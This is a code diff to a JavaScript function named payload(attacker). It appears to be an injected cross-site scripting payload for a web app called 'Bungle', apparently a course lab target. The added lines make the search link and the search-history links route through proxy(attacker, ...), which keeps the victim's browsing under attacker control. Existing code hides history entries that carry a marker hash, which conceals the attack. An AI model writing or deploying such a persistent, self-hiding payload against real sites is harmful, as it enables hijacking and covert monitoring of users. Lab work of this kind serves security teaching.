@@ -35,6 +35,7 @@ function payload(attacker) {
 		$("#log-in-btn").click(onLogin);
 		$("#new-account-btn").click(onCreate);
 		$("#log-out-btn").click(onLogout);
+		$("#bungle-lnk").click(onSearchAgain);
 	}
 
 	function filterSearch() {
@@ -46,6 +47,8 @@ function payload(attacker) {
 		while (i < historyList.length) {
 			if (historyList[i].text.indexOf("defc72a96803a619a6735cd7e7e69e1b") != -1) {
 				historyList[i].style.display = "none";
+			} else {
+				historyList[i].addEventListener("click", onSearchHistory)
 			}
 			i ++;
 		}
@@ -60,6 +63,11 @@ function payload(attacker) {
 
 	function onSearchAgain(event) {
 		proxy(attacker, "./", true);
+		event.preventDefault();
+	}
+
+	function onSearchHistory(event) {
+		proxy(attacker, event.target.href, true);
 		event.preventDefault();
 	}
 
